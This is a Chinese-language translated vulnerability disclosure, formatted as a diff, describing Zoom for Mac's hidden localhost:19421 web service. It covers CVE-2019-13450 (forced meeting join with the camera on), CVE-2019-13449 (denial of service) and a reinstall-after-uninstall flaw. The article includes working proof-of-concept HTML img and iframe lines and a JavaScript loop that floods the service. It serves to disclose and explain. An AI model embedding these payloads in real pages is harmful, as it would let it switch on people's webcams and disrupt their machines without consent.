@@ -1,0 +1,163 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ **![ZoomPresence-Room.png](https://image.3001.net/images/20190712/1562895023_5d27e2aff2cc4.png!small)**
+**本文中，作者发现了视频会议软件ZOOM for
+Mac客户端程序的两个漏洞和一个缺陷，安装有ZOOM客户端的Mac系统用户可能会受到RCE攻击，可被攻击者远程未授权开启本机摄像头。**
+
+>
+> Zoom是一款多人云视频会议软件，为用户提供兼备高清视频会议与移动网络会议功能的免费云视频通话服务。用户可通过手机、平板电脑、PC与工作伙伴进行多人视频及语音通话、屏幕分享、会议预约管理等商务沟通。Zoom支持100人以下的高清视频通话，是目前领先的移动视频会议工具。Zoom适用于Windows、Mac、Linux、iOS、Android系统。
+
+漏洞原因在于ZOOM for Mac系统的客户端软件中存在bug缺陷，攻击者通过在自己网站中部署利用代码，当安装有ZOOM for
+Mac的系统用户访问该网站后，就能触发漏洞，实现未授权的摄像头开启。该漏洞可能会对采用Zoom软件应用于日常视频会议的全球75万家公司造成影响。
+
+CVE漏洞编号
+
+> CVE-2019–13450：开启受害者系统摄像头导致的信息泄露漏洞（未修复）
+>
+> CVE-2019–13449：DoS拒绝服务攻击 （在ZOOM 4.4.2客户端版本中已经修复）
+
+## 漏洞介绍
+
+该漏洞可以通过访问一个恶意网站的方式，远程未授权地激活开启受害者系统中与ZOOM关联的摄像头，并强制ZOOM客户端用户加入某个ZOOM视频会议。
+
+这种情况下，可让受害者反复不停地加入一个无效的视频会议，致使其安装有ZOOM客户端形成拒绝服务攻击（DoS）。此外，如果用户在系统中安装了ZOOM客户端软件之后又卸载了它，但是，它仍然在你的系统中残存有一个localhost的Web服务，通过该残存服务，ZOOM可以不用任何用户交互操作即能实现完整的程序重装，目前，这个所谓的“重装”功能依然有效。
+
+在Mac系统中，如果你安装了ZOOM客户端软件，它会形成一个本地localhost:19421的Web服务，你可以在终端中用命令 _ **lsof -i
+:19421**_ 来查看。
+
+首先，这种安装了ZOOM客户端软件，就开启一个无任何文档说明的API接口的事至少让我觉得不妥；其次，我访问的任何网站都可能会与该localhost
+Web服务发生交互，这对搞安全的我来说，简单就是一个风险隐患。以下是ZOOM源码中开启locaohost服务的代码段：
+
+![01.png](https://image.3001.net/images/20190712/1562891663_5d27d58f11f5e.png!small)看到代码的时候我就想，是否其参数处理过程会存在缓冲区溢出漏洞，这样就会让操作系统面临RCE攻击。当然，此仅当猜测，最终也没发现这样的问题。当访问一个视频会议加入（Join）链接之后，可通过Chrome浏览器调试工具对该locaohost服务的行为进行观察，如下：
+
+![02.png](https://image.3001.net/images/20190712/1562893269_5d27dbd59dde8.png!small)后来我还发现，该locaohost服务对应的页面并不执行正常的AJAX请求，但它会从本机运行的localhost
+web服务中加载一张图片，这张加载图片的不同尺寸都对应着表示ZOOM服务的不同状态和错误码，如下：
+
+![03.png](https://image.3001.net/images/20190712/1562893285_5d27dbe55f94e.png!small)可怕的是，从以上这个状态和错误码推断来看（download、install、upgrade、launch...），这个本机的localhost
+web服务具备的功能，不仅仅是能启动ZOOM视频会议，也就是前述提到的，如果用户卸载了ZOOM，它还能执行重装......，等等。
+
+我的疑问是，为什么这个localhost
+web服务会返回这种以图片尺寸为状态响应的编码数据？唯一的理由是，它是为了绕过CORS策略限制。但是，针对本机localhost的CORS策略，浏览器已经完全不做限制了啊。比如，Chrome自2010年起，就已经不对localhost的CORS请求进行限制了。我猜想ZOOM此举是出于安全考虑，也貌似可能是滥用这种技巧去绕过CORS策略。在此，我对开启受害者系统摄像头的CVE-2019–13450、导致DoS拒绝服务的CVE-2019–13449以及卸载后残存的重装bug进行一个简要分析。
+
+## 激活受害者系统的摄像头漏洞
+
+我用不同账号在本机创建了一个ZOOM私人会议，并用Postman对其进行请求分析和参数测试，看看启动一个会议所需的最小GET请求是些什么。分析中有大量随机参数发向localhost
+web服务，其中有两个重要参数如下：
+
+> action=join （执行操作-加入）
+>
+> confno=[whatever the conference number is] （会议编号）
+
+操纵这两个参数，从Postman中构造以下GET请求，我就能让我的电脑加入其它用户创建的ZOOM视频会议了。
+
+之后，我又修改了其它参数看能否实现其它行为，但从ZOOM公开的说明文档和ProtoBuff机制来看，我找不到任何可利用的隐藏功能，而且，这个本机的web服务没有任何官方说明，难以理解。以上的GET请求只能作为一个小小的验证性POC，用它可诱使受害者强制用户加入会议，新加入会议后，
+“New Meeting”的默认设置是会让用户选择音频/视频加入，我认为这本身就是一个安全漏洞。
+
+之后，我注意到Tenable上报过ZOOM的一个RCE漏洞（CVE-2018-15715），它在去年底才被完整修复，但如果CVE-2018-15715和我发现的这个漏洞结合的话，可能会对安装有ZOOM客户端的任何Mac系统形成RCE攻击影响。而就我当前的发现来说，我暂时还没真正的exploit利用代码，如何让受害者系统的摄像头激活开启是一个难点。但当我设置办公视频会议时，看到了ZOOM中的以下这个界面，也就是说，在设置会议的时候，可选择让参会者开启摄像头加入会议：
+
+![04.png](https://image.3001.net/images/20190712/1562893412_5d27dc640d097.png!small)选择Video项下的
+“Participants: On”按钮，其它参会人员将会自动开启其本机摄像头，以视频形式加入会议。这样一来，我就可以继续再构造新的POC了。
+
+## POC
+
+由于本机的localhost web服务在后台运行，所以实际来说，要使受害者中招，根本不需要以传统方式真实运行目标应用。第一行POC代码强制受害者加入会议：
+
+`<img
+src="[http://localhost:19421/launch?action=join&confno=492468757](http://localhost:19421/launch?action=join&confno=492468757)"/>`
+
+如果要使加入会议的受害者自动开启摄像头，可把以下视频邀请链接嵌入到由攻击者控制的恶意网站iframe中就行，第二行POC代码：
+
+`<iframe src="<https://zoom.us/j/492468757>"/>`
+
+攻击者只需把以上两行POC代码部署在自己控制的网站中，然后诱使受害者访问浏览，受害者Mac系统中的ZOOM客户端就会开启摄像头，加入攻击者预先设置的视频会议。这种POC代码嵌入可以通过恶意广告，或钓鱼页面等方式。目前，该漏洞仍然有效。<https://jlleitschuh.org/zoom_vulnerability_poc/>这是我构造的一个POC页面，它实现强制加入会议：
+
+![2019-07-11_173721.jpg](https://image.3001.net/images/20190712/1562893497_5d27dcb941cd7.jpg!small)<https://jlleitschuh.org/zoom_vulnerability_poc/zoompwn_iframe.html>，这个POC页面实现开启你的摄像头，加入我的视频会议：  
+
+![2019-07-11_174157.jpg](https://image.3001.net/images/20190712/1562893544_5d27dce833a0d.jpg!small)
+
+## DOS拒绝服务攻击漏洞
+
+以上漏洞同样可以导致对受害者系统的DOS攻击，只要发送一个重复无效的GET请求给受害者，受害者系统中的ZOOM客户端程序就会从当前系统中反复执行GET请求，具体POC如下：
+
+    
+    
+    <body>
+    
+    <script>
+    
+    // It's actually better if this number isn't a valid zoom number.
+    
+    var attackNumber = "694138052"
+    
+    setInterval(function(){
+    
+      var image = document.createElement("img");
+    
+      // Use a date to bust the browser's cache
+    
+      var date = new Date();
+    
+      image.src = "[http://localhost:19421/launch?action=join&confno=](http://localhost:19421/launch?action=join&confno=)" + attackNumber + "&" + date.getTime();
+    
+      image.onload = function() {
+    
+        // Be tidy, clean up the DOM afterwards
+    
+        image.parentNode.removeChild(image);
+    
+      };
+    
+      document.body.appendChild(image);
+    
+    }, 1);
+    
+    </script>
+    
+    </body>
+
+目前，该DOS漏洞已在ZOOM客户端4.4.2版本中得到修复。
+
+## 卸载后残存的重装bug
+
+如果用户在系统中安装了ZOOM客户端程序之后，就会自动开启前述的localhost web服务，即使是卸载了ZOOM程序，这个localhost
+web服务仍然存在，在后续的会议发起请求时，它支持ZOOM的重装和更新。我通过反编译该localhost web服务去了解其中的逻辑调用。在Hopper
+Disassemble帮助下，我发现了localhost web服务中涉及的以下方法函数：
+
+![05.png](https://image.3001.net/images/20190712/1562893630_5d27dd3ed68d1.png!small)这看起来像是，从某个API接口请求中获取参数，并用它创建一个下载网址，用于升级已安装的ZOOM程序。而这个方法函数又由以下方法来控制，它会确保下载URL来自zoom的可信域名：
+
+![06.png](https://image.3001.net/images/20190712/1562893658_5d27dd5aa7ee0.png!small)在这个localhost
+web服务中，内置有一个用来在Mac系统中更新和重装当前ZOOM程序的API，用户可以通过以下方式来确认：
+
+> 如果你的Mac系统此前从未安装过ZOOM，则先安装ZOOM；
+>
+> 然后打开ZOOM客户端，接着把它关闭；
+>
+> 把Applications/zoom.us.app文件删除放到垃圾箱，执行对ZOOM程序的卸载；
+>
+> 现在，点击任何ZOOM会议加入邀请链接，这时，你系统中残存的localhost
+> web服务会“友善”地执行对ZOOM程序的重装，之后并会启动ZOOM程序。
+
+可以在反编译后的ZOOM客户端代码中看到一些内置域名，引用这些域名对应的链接可以从ZOOM官网实现远程的更新重装动作，比如这个<https://zipow.com/upgrade?os=mac>：
+
+![07.png](https://image.3001.net/images/20190712/1562894891_5d27e22bc7d5b.png!small)对这些内置域名whois之后，可以发现这些域名的存在可被劫持利用风险，如zoomgov.com到2019年5月1日就过期了，如果ZOOM厂商未能及时续注，那么攻击者就可能把该域名注为己有，进而托管恶意程序，对正常安装和卸载了ZOOM客户端的用户形成感染。当然，如果进一步利用，这种域名劫持风险结合上述漏洞，将能在ZOOM客户端系统中实现RCE攻击。还好，在我上报漏洞之后，ZOOM方面对这个zoomgov.com及时续注到了2024年5月1日。
+
+## 这是最基本不应该发生的安全漏洞
+
+在我看来，网站和桌面应用程序之间不应该实现互动调用，浏览器应该执行一个最基本的沙箱程序来防止恶意代码在用户机器上执行。
+
+因为ZOOM用户系统中存在的那个localhost
+web服务可以接收到HTTP和GET请求，所以，这就能绕过浏览器原有沙箱防护机制实现代码执行，导致ZOOM用户处于很大攻击面之中。
+
+## 漏洞上报进程
+
+作者于2019年3月8日向ZOOM官方上报了以上存在的问题，ZOOM方面承诺会在90天内修复漏洞，并会尽快给出“快速修复”解决方案；期间，历经了10多轮反复冗长的沟通协商，2019年6月21日，ZOOM终于告知作者漏洞已经修复，但在后期7月7日的复测过程中，作者又成功复现了远程摄像头开启漏洞。非常无奈之下，作者还是选择了公开披露漏洞。
+
+## 总结
+
+当前，Zoom、Google Meet 和 Skype for
+Business是主流的视频会议应用，截至2015年，Zoom拥有超过4000万用户，鉴于苹果电脑占个人电脑市场的10%，自2015年以来，Zoom市场占有率持续增长，Zoom的用户中至少有400万人在使用Mac系统。本质来说，以上漏洞都会对Zoom用户造成严重安全威胁，但遗憾的是，Zoom在90天宽限期内，仍然未完全修复，现在，将近有400万Zoom用户面临安全风险。
+
+如果你想反编译Zoom客户端程序，它在电脑系统的~/.zoomus目录下，更多POC技术细节参照[作者Github](https://github.com/JLLeitschuh/zoom_vulnerability_poc)。
+
+ ***参考来源：[medium](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5)，clouds编译，转载请注明来自FreeBuf.COM**  
+
